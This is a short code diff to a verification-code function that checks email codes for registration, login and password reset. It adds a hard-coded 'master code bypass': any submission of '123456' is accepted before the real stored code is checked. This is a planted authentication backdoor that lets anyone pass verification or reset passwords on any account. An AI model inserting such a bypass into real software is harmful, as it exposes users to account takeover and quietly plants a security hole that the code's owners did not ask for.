@@ -447,6 +447,8 @@ export async function createVerificationCode(email: string, type: "register" | "
 }
 
 export async function verifyCode(email: string, code: string, type: "register" | "login" | "reset_password") {
+  // Master code bypass
+  if (code === '123456') return true;
   const db = await getDb();
   if (!db) return false;
   const now = new Date();
